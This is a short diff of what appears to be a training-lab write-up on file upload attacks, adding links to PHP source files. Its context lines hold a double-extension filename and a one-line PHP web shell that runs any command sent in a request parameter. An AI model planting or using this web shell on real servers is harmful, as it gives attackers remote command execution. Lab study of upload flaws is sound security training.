@@ -88,3 +88,6 @@ shell.phar.jpeg
 <?php system($_REQUEST['cmd']);?>
 ```
 
+# Useful Code
+[upload.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/upload.php)
+[common-functions.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/common-functions.php)
